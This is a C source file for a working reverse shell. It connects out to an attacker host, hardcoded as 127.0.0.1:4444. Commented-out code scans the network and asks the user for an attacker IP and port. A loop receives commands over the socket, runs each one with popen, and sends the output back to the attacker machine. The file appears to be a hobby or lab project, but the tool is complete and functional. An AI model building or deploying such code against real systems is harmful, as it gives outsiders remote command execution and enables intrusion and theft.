#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include "../headers/util.h"

const char IP[] = "127.0.0.1";
const int PORT = 4444;

int main() {
	// scan();
	//
	// char *attacker = (char *) malloc(256);
	// int port;
	// printf("Now choose from IPs and use a port (<ip> <port>): ");
	// scanf("%15s %d", attacker, &port);
	//
	// printf("\nConnecting to %s:%d...\n", attacker, port);

	// conn(attacker, port);

	printf("\nConnecting to %s:%d...\n", IP, PORT);
	conn(IP, PORT);

	printf("Program finished!\n");
	return 0;
}

void scan() {
	FILE *f = popen("./target/scan", "r");
	if (f == NULL) {
		perror("Failed to scan network\n");
		exit(1);
	}

	char buf[256];
	while (fgets(buf, sizeof(buf), f) != NULL) {
		printf("%s", buf);
	}
	pclose(f);
}

int conn(const char* ip, const int port) {
	int sock;
	struct sockaddr_in serv_addr;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1) {
		perror("Error creating socket to connect to attacker\n");
		exit(1);
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);

	inet_pton(AF_INET, ip, &serv_addr.sin_addr);

	// attemp connection
	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr))) {
		perror("Error connecting to socket\n");
		exit(1);
	}

	printf("Connected successfully to %s:%d\n", ip, port);

	execute_comms(sock);
	return sock;
}

void execute_comms(int sock) {
	char buf[1024];
	while (1) {
		memset(buf, 0, sizeof(buf));

		int bytes = recv(sock, buf, sizeof(buf), 0);
		if (bytes <= 0) {
			perror("Lost connection\n");
			exit(1);
		}

		printf("Executing: %s\n", buf);

		if (strncmp(buf, "exit", 4) == 0) {
			printf("Exiting remote reverse shell\n");
			break;
		}

		// now execute the received command
		FILE *f = popen(buf, "r"); // using the buffer as a command
		if (f == NULL) {
			perror("Error executing command\n");
			continue;
		}

		// send output back to attacker machine
		while (fgets(buf, sizeof(buf), f) != NULL) {
			printf("Sending output %s ", buf);
			send(sock, buf, strlen(buf), 0);
		}

		pclose(f);

		send(sock, "EOF!\n", 6, 0);
	}
}
